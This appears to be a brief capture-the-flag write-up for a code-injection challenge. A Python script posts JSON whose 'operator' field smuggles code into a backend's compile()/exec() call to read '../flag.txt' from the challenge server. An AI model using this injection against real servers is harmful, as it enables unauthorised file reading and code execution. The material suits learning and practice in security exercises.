Unsanitized user input in Python backend using compile() -> exec().

```python
import requests
  
code = '\nresult = open("../flag.txt", "r").read();'
post_request = {"current_health": "0", "attack_power": "0", "operator": code}
  
session = requests.Session()
website = "http://142.93.39.188:30229/api/get_health"
  
r = session.post(website, json=post_request)
  
print(r.content.decode())
```